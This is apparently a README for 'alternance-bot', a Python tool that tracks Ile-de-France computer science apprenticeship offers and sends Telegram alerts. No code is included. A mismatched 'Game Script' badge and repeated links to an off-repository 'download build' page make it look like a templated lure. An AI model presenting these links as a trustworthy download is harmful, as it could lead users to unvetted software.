# alternance-bot v2026 - Job Alert Utility 2026

> **Automated apprenticeship tracking for computer science roles in Ile-de-France.** alternance-bot discovers fresh listings, checks them against your criteria, and delivers matching opportunities through Telegram.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/michaelwestnv1565/alternance-bot-job-alert?style=flat-square)](https://github.com/michaelwestnv1565/alternance-bot-job-alert)

---

<p align="center">
  <a href="https://michaelwestnv1565.github.io/alternance-bot-job-alert/">
    <img src="https://img.shields.io/badge/Download-alternance-bot%20Script-brightgreen?style=for-the-badge" alt="Download alternance-bot Script">
  </a>
</p>

> **[Download alternance-bot directly](https://michaelwestnv1565.github.io/alternance-bot-job-alert/)**

---

[Download Latest Build](https://michaelwestnv1565.github.io/alternance-bot-job-alert/)

---

## What alternance-bot Does

alternance-bot is a Python-based monitoring tool for computer science apprenticeship opportunities in Ile-de-France. It looks for newly published offers, applies keyword and criteria-based filtering, and stores previously handled listings in JSON so the same opportunity does not trigger repeated notifications.

The bot is suitable for unattended operation with GitHub Actions, which runs the search every 3 hours by default. Whenever a listing meets the configured conditions, a Telegram alert is sent in real time, avoiding the need to repeatedly check job sites manually.

## Capabilities

- Tracks newly available computer science alternance opportunities in Ile-de-France
- Selects listings according to configured keywords and filters
- Records processed offers in JSON to prevent duplicate notifications
- Delivers Telegram messages when a new matching listing is found
- Collects data through an API-oriented workflow
- Supports recurring GitHub Actions execution at 3-hour intervals
- Preserves processing state from one run to the next

## Getting Started

1. Download or clone the repository.
2. Install the Python packages required by the project.
3. Configure the Telegram bot information and your preferred search filters.
4. Test the program locally, or enable GitHub Actions for scheduled execution.

Run the main script with:

    python main.py

If the workflow uses a different script path or entry point, adjust the command to reflect the repository structure before turning on automation.

## Configuration Reference

| Setting | Purpose | Example |
| --- | --- | --- |
| `keywords` | Words used when identifying suitable listings | `["python", "data", "web"]` |
| `filters` | Additional conditions for restricting results | `computer science`, `Ile-de-France` |
| `telegram_token` | Authentication token for the Telegram bot | `123456:ABC...` |
| `telegram_chat_id` | Chat or channel that receives alerts | `-1001234567890` |
| `persistence_file` | JSON storage location for previously seen offers | `seen.json` |
| `schedule` | GitHub Actions execution frequency | `every 3 hours` |

## Supported Environment and Scope

The utility targets Python runtimes and scheduled jobs managed by GitHub Actions. Its default use case is monitoring computer science apprenticeship listings in Ile-de-France; other job markets require suitable changes to the filtering configuration.

The parser and query behavior depend on the structure of the upstream API or listing source. If that source changes its response format, corresponding parsing or query updates may be necessary.

## Frequently Asked Questions

**What is the first step?**  
Prepare the Python environment, enter the Telegram settings, and run the bot manually once to verify that notifications are configured correctly.

**What is the default checking interval?**  
When run by GitHub Actions, the bot checks for new offers every 3 hours.

**Are the keywords and filters customizable?**  
Yes. Modify the keyword and filter rules to match the type of apprenticeship opportunities you want to follow.

**How are duplicate offers avoided?**  
The bot saves seen items using JSON persistence, allowing that information to remain available between executions.

**Is the search limited to Ile-de-France?**  
The current configuration targets computer science alternance offers in Ile-de-France. The query and filters can be adapted for another scope when supported by the source.

**Is GitHub Actions required?**  
No. The program can be launched directly from a local Python environment. GitHub Actions is optional for recurring automated checks.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
